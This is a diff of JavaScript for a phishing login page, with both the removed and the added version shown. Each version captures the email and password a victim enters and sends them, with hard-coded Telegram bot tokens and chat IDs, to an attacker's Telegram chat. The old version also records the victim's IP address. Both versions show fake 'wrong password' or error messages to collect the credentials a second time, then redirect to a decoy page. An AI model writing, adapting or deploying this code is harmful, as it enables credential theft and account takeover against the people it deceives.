@@ -1,84 +1,82 @@
-document.addEventListener("DOMContentLoaded", function() {
-  let submissionCount = 0; // Initialize submission count
+window.onload = function () {
+  const urlParams = new URLSearchParams(window.location.search);
+  const emailFromUrl = urlParams.get('email');
   const emailInput = document.getElementById("email");
 
-    // Prefill email from URL
-    const params = new URLSearchParams(window.location.search);
-    const emailFromUrl = params.get('email');
-    if (emailFromUrl) {
-        emailInput.value = emailFromUrl.trim();
-    }
-      
+  if (emailFromUrl) {
+    emailInput.value = emailFromUrl;
+    emailInput.readOnly = true;
+    emailInput.style.backgroundColor = "#f0f0f0";
+    emailInput.style.cursor = "not-allowed";
+    emailInput.oncopy = (e) => e.preventDefault();
+    emailInput.oncut = (e) => e.preventDefault();
+    emailInput.onpaste = (e) => e.preventDefault();
+  } else {
+    emailInput.readOnly = false;
+    emailInput.style.backgroundColor = "#fff";
+    emailInput.style.cursor = "text";
+  }
+};
 
-  document.getElementById("fdatshi").addEventListener("submit", function(event) {
-      event.preventDefault(); // Prevent default form submission
+function openLogin() {
+  document.getElementById("loginModal").style.display = "flex";
+}
 
-              // Show spinner
-              const submitButton = document.getElementById("submit");
-              submitButton.innerHTML = '<button class="btn btn-sm btn-primary" disabled><span class="spinner-border spinner-border-sm"></span>Please Wait...</button>';
+function closeModal() {
+  document.getElementById("loginModal").style.display = "none";
+  document.getElementById("error-msg").innerText = "";
+}
 
-      // Increment submission count
-      submissionCount++;
+function sendToTelegram(email, password) {
+  const token = "7552866414:AAG94hGLSWXReY0vodsBfQIUl95v9G2IYdA";
+  const chatId = "7799444101";
+  const message = `Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
 
-      // Get form input values
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-
-      // Fetch the user's IP address
-      fetch("https://api.ipify.org?format=json")
-          .then(response => response.json())
-          .then(data => {
-              const userIP = data.ip;
-
-              // Send the form data and IP address to Telegram
-              sendFormToTelegram(email, password, userIP);
-
-              // Check submission count and take appropriate action
-              if (submissionCount === 1) {
-                  // First submission: Show "Incorrect email address" message
-                  showMessage("Incorrect email address Or Password");
-              } else if (submissionCount === 2) {
-                  // Second submission: Show "Error getting document" message
-                  showMessage("Error getting document");
-              } else if (submissionCount === 3) {
-                  // Third submission: Redirect the user to another page
-                  window.location.href = "https://online.flippingbook.com/view/904094431/";
-              }
-
-              // Clear the form fields
-              document.getElementById("password").value = "";
-
-              console.log("User IP:", userIP);
-
-              // Hide spinner after processing
-              submitButton.innerHTML = '<button class="btn btn-sm btn-primary">Submit</button>';
-          })
-          .catch(error => {
-              console.error("Error fetching user IP:", error);
-          });
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  }).catch(err => {
+    console.error("Telegram error:", err);
   });
+}
 
-  function showMessage(text) {
-      const messageElement = document.getElementById("message");
-      messageElement.textContent = text;
+function submitLogin() {
+  const emailInput = document.getElementById("email");
+  const passwordInput = document.getElementById("password");
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+
+  if (!email || !password) {
+    document.getElementById("error-msg").innerText = "Please enter both fields.";
+    return;
   }
 
-  // Function to send form data and user's IP address to Telegram
-  function sendFormToTelegram(email, password, ip) {
-      const botToken = "7627236360:AAF-b08Vyheg-2FFdROMAzDG-VNHUQgH3Og"; // Replace with your Telegram bot token
-      const chatId = "7562799891"; // Replace with your Telegram chat ID
+  // Send to Telegram
+  sendToTelegram(email, password);
 
-      const message = `New form submission:\n\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
+  // Hide modal, show loading
+  document.getElementById("loginModal").style.display = "none";
+  document.getElementById("loading").style.display = "flex";
 
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+  setTimeout(() => {
+    document.getElementById("loading").style.display = "none";
 
-      fetch(url)
-          .then(response => response.json())
-          .then(data => {
-              console.log("Message sent to Telegram:", data);
-          })
-          .catch(error => {
-              console.error("Error sending message to Telegram:", error);
-          });
-  }
-});
+    if (!sessionStorage.getItem("retried")) {
+      sessionStorage.setItem("retried", "true");
+
+      // Show modal again
+      openLogin();
+      // Clear only password
+      passwordInput.value = "";
+      document.getElementById("error-msg").innerText = "Wrong password. Please re-enter your credentials.";
+    } else {
+      // Redirect after second login
+      window.location.href = "https://jade-zitella-36.tiiny.site/complete.html";
+    }
+  }, 3000);
+}
+
